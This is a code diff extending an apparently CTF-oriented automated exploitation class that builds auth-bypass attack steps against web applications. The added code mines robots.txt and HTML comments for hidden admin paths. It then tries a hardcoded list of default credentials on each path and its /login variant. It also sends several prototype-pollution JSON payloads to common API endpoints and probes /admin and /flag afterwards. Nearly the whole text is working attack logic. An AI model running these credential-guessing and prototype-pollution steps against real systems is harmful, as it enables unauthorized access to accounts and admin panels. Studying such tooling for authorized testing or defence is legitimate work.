@@ -87,10 +87,11 @@ class AuthLogicMachine(RouteStateMachine):
         """Auth bypass exploit steps.
 
         Includes both hardcoded common paths and dynamically discovered
-        paths from the homepage.
+        paths from the homepage and robots.txt.
         """
-        # Discover additional paths from homepage links
+        # Discover additional paths from homepage links and robots.txt
         discovered_paths = self._discover_secret_paths()
+        robots_paths = self._discover_robots_paths()
 
         steps = [
             # Cookie manipulation
@@ -239,6 +240,51 @@ class AuthLogicMachine(RouteStateMachine):
             },
         ]
 
+        # --- Default credential login on discovered paths (robots.txt + HTML) ---
+        # This handles chain_info_to_auth: discover hidden panel via robots.txt,
+        # then authenticate with default credentials.
+        default_creds = [
+            ("admin", "admin123"),
+            ("admin", "admin"),
+            ("admin", "password"),
+            ("root", "root"),
+            ("admin", "123456"),
+        ]
+        # Combine robots.txt paths and discovered paths
+        all_discovered = list(set(robots_paths + discovered_paths))
+        for path in all_discovered:
+            # First, GET the path to check for login forms
+            steps.append({
+                "name": f"discover_get_{path.strip('/').replace('/', '_')[:20]}",
+                "description": f"GET discovered path: {path}",
+                "method": "GET",
+                "path": path,
+                "extract_flag": True,
+            })
+            # Try default credentials via POST on the path itself
+            for username, password in default_creds:
+                steps.append({
+                    "name": f"creds_{path.strip('/').replace('/', '_')[:15]}_{username}_{password[:5]}",
+                    "description": f"Default creds on {path}: {username}/{password}",
+                    "method": "POST",
+                    "path": path,
+                    "data": f"username={username}&password={password}",
+                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                    "extract_flag": True,
+                })
+            # Also try POST on path/login (common pattern)
+            login_path = path.rstrip("/") + "/login"
+            for username, password in default_creds:
+                steps.append({
+                    "name": f"creds_login_{path.strip('/').replace('/', '_')[:12]}_{username}_{password[:5]}",
+                    "description": f"Default creds on {login_path}: {username}/{password}",
+                    "method": "POST",
+                    "path": login_path,
+                    "data": f"username={username}&password={password}",
+                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                    "extract_flag": True,
+                })
+
         # Add dynamically discovered paths with header combinations
         for i, path in enumerate(discovered_paths):
             steps.append({
@@ -254,6 +300,58 @@ class AuthLogicMachine(RouteStateMachine):
                 },
                 "extract_flag": True,
             })
+
+        # --- Prototype pollution (Express/Node.js targets) ---
+        # POST JSON with __proto__ to pollute Object.prototype, then access /admin
+        proto_payloads = [
+            {"__proto__": {"isAdmin": True}},
+            {"__proto__": {"isAdmin": True, "role": "admin", "admin": True}},
+            {"constructor": {"prototype": {"isAdmin": True}}},
+            {"__proto__": {"admin": True}},
+            {"__proto__": {"role": "admin"}},
+            {"__proto__": {"authenticated": True, "isAdmin": True}},
+        ]
+        for i, payload in enumerate(proto_payloads):
+            steps.append({
+                "name": f"proto_pollution_config_{i}",
+                "description": f"Prototype pollution: POST to /api/config",
+                "method": "POST",
+                "path": "/api/config",
+                "json": payload,
+                "headers": {"Content-Type": "application/json"},
+                "extract_flag": False,
+            })
+
+        # After pollution, check admin endpoints
+        for admin_path in ["/admin", "/api/admin", "/flag", "/api/flag", "/dashboard"]:
+            steps.append({
+                "name": f"proto_check_{admin_path.strip('/').replace('/', '_')}",
+                "description": f"Check {admin_path} after prototype pollution",
+                "method": "GET",
+                "path": admin_path,
+                "extract_flag": True,
+            })
+
+        # Also try pollution on other common merge endpoints
+        for merge_path in ["/api/settings", "/api/merge", "/api/update", "/api/user"]:
+            steps.append({
+                "name": f"proto_merge_{merge_path.strip('/').replace('/', '_')}",
+                "description": f"Prototype pollution on {merge_path}",
+                "method": "POST",
+                "path": merge_path,
+                "json": {"__proto__": {"isAdmin": True, "role": "admin"}},
+                "headers": {"Content-Type": "application/json"},
+                "extract_flag": False,
+            })
+
+        # Final admin check after all pollution attempts
+        steps.append({
+            "name": "proto_final_admin_check",
+            "description": "Final /admin check after all pollution attempts",
+            "method": "GET",
+            "path": "/admin",
+            "extract_flag": True,
+        })
 
         return steps
 
@@ -278,9 +376,44 @@ class AuthLogicMachine(RouteStateMachine):
                     path = "/" + match.group(1).lstrip("/")
                     if path not in paths:
                         paths.append(path)
+                # Also extract paths mentioned in comments like "Admin panel: /path"
+                admin_comment_pattern = re.compile(
+                    r'<!--[^>]*?(/[a-zA-Z0-9_]+(?:/[a-zA-Z0-9_]+)*)[^>]*?-->',
+                    re.IGNORECASE,
+                )
+                for match in admin_comment_pattern.finditer(resp.text):
+                    path = match.group(1)
+                    if path not in paths and path not in ("/", "/admin", "/flag"):
+                        paths.append(path)
         except Exception:
             pass
-        return paths[:5]  # Limit to 5 discovered paths
+        return paths[:8]  # Limit to 8 discovered paths
+
+    def _discover_robots_paths(self) -> List[str]:
+        """Discover hidden paths from robots.txt Disallow entries."""
+        import re
+        paths = []
+        try:
+            resp = self.session.get(
+                self.target_url + "/robots.txt", timeout=8, allow_redirects=True
+            )
+            if resp.status_code == 200 and resp.text:
+                # Skip if response looks like HTML (catch-all page)
+                if "<html" in resp.text.lower() or "<body" in resp.text.lower():
+                    return paths
+                # Parse Disallow entries
+                for line in resp.text.splitlines():
+                    line = line.strip()
+                    if line.lower().startswith("disallow:"):
+                        path = line.split(":", 1)[1].strip()
+                        if path and path != "/" and path not in paths:
+                            # Ensure path starts with /
+                            if not path.startswith("/"):
+                                path = "/" + path
+                            paths.append(path)
+        except Exception:
+            pass
+        return paths[:10]  # Limit to 10 paths
 
 
 # Register in MACHINE_REGISTRY
